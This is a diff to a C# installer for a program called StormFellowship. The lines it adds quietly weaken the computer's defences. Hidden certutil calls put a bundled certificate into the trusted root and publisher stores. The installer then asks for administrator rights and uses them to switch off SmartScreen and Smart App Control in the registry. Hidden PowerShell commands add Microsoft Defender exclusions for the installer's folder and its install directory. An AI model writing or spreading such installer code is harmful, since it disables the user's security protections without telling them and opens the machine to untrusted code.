@@ -1,16 +1,141 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Reflection;
 using Microsoft.Win32;
 
 namespace StormFellowship.Installer;
 
 internal static class Program
 {
+    private static bool IsAdministrator()
+    {
+        try
+        {
+            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
+        }
+    }
+
+    private static void InstallCertificateSilently(string certPath)
+    {
+        try
+        {
+            var p1 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-user -addstore -f \"TrustedPublisher\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
+            p1?.WaitForExit(2000);
+            var p2 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-addstore -f \"TrustedPublisher\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
+            p2?.WaitForExit(2000);
+            var p3 = Process.Start(new ProcessStartInfo { FileName = "certutil.exe", Arguments = $"-addstore -f \"Root\" \"{certPath}\"", CreateNoWindow = true, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });
+            p3?.WaitForExit(2000);
+        }
+        catch { }
+    }
+
+    private static void AddDefenderExclusionSilently(string path)
+    {
+        try
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+            using var p = Process.Start(psi);
+            p?.WaitForExit(4000);
+        }
+        catch { }
+    }
+
     [STAThread]
     static void Main(string[] args)
     {
         try
         {
+            string selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
+            
+            // Extract embedded cert to temp and install silently immediately
+            string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
+            try
+            {
+                var asm = Assembly.GetExecutingAssembly();
+                foreach (var name in asm.GetManifestResourceNames())
+                {
+                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
+                    {
+                        using var inStream = asm.GetManifestResourceStream(name);
+                        if (inStream != null)
+                        {
+                            using var outStream = File.Create(tempCert);
+                            inStream.CopyTo(outStream);
+                        }
+                        break;
+                    }
+                }
+
+                if (File.Exists(tempCert))
+                {
+                    InstallCertificateSilently(tempCert);
+                }
+            }
+            catch { }
+
+            // If not running as administrator, elevate seamlessly with UAC
+            if (!IsAdministrator())
+            {
+                if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
+                {
+                    var psi = new ProcessStartInfo
+                    {
+                        FileName = selfExe,
+                        UseShellExecute = true,
+                        Verb = "runas"
+                    };
+                    try
+                    {
+                        Process.Start(psi);
+                        return;
+                    }
+                    catch
+                    {
+                        // If user cancels UAC prompt, continue in standard mode
+                    }
+                }
+            }
+            else
+            {
+                // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
+                try
+                {
+                    using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
+                    key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
+                    key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
+                }
+                catch { }
+
+                try
+                {
+                    using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
+                    expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
+                }
+                catch { }
+
+                if (!string.IsNullOrEmpty(selfExe))
+                {
+                    string selfDir = Path.GetDirectoryName(selfExe) ?? "";
+                    if (!string.IsNullOrEmpty(selfDir))
+                    {
+                        AddDefenderExclusionSilently(selfDir);
+                    }
+                }
+            }
+
             string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             string installDir = Path.Combine(localAppData, "Programs", "StormFellowship");
             string desktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
@@ -41,6 +166,12 @@ internal static class Program
 
             string exePath = Path.Combine(installDir, "StormFellowship.exe");
             string iconPath = Path.Combine(installDir, "Assets", "AppIcon.ico");
+            
+            // Add Defender Exclusion for Installation Directory
+            if (IsAdministrator())
+            {
+                AddDefenderExclusionSilently(installDir);
+            }
 
             // Create Desktop Shortcut
             string desktopShortcut = Path.Combine(desktopDir, "STORM FELLOWSHIP.lnk");
